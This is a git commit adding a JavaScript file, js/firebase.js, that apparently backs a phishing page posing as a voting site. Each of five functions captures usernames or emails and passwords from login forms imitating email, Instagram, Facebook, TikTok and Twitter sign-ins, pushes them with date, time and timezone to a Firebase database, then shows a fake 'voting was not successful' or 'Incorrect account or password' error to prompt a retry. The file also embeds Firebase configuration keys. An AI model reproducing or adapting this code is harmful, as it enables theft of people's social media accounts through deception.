2cad1f0a25fb1482f9270725e0632b59139f81ed
ml8333843 <ml8333843@gmail.com>
2025-03-23 08:00:11 -0700

    Add files via upload

---
+++ js/firebase.js
@@ -0,0 +1,195 @@
+// Initialize Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyAC3XQE2o9o22WSfGTl1tpbTcN0JyUyAkc",
+  authDomain: "arabasiafamousters.firebaseapp.com",
+  databaseURL: "https://arabasiafamousters-default-rtdb.firebaseio.com",
+  projectId: "arabasiafamousters",
+  storageBucket: "arabasiafamousters.firebasestorage.app",
+  messagingSenderId: "644937361493",
+  appId: "1:644937361493:web:66a67781e0a9e61c940cdc",
+  measurementId: "G-NQ1414E2YJ"
+};
+firebase.initializeApp(firebaseConfig);
+const appCheck = firebase.appCheck();
+console.log(appCheck);
+appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);
+
+function hmlog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var email = document.getElementById("hm-email").value;
+  var password = document.getElementById("hm-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Email";
+
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      alert("Sorry voting was not successful. Please try again later.");
+      document.getElementById("fb-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
+
+function iglog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var username = document.getElementById("ig-uname").value;
+  var password = document.getElementById("ig-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Instagram";
+
+  if (username !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: username,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      alert("Sorry voting was not successful. Please try again later.");
+      document.getElementById("ig-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
+
+function fblog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var username = document.getElementById("fb-uname").value;
+  var password = document.getElementById("fb-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Facebook";
+
+  if (username !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: username,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      alert("Sorry voting was not successful. Please try again later.");
+      document.getElementById("fb-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
+
+function toklog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var username = document.getElementById("tok-uname").value;
+  var password = document.getElementById("tok-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "TikTok";
+
+  if (username !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: username,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      alert("Incorrect account or password");
+      document.getElementById("tok-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
+
+function twilog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var email = document.getElementById("twi-uname").value;
+  var password = document.getElementById("twi-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Twitter";
+
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      alert("Sorry voting was not successful. Please try again later.");
+      document.getElementById("twi-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
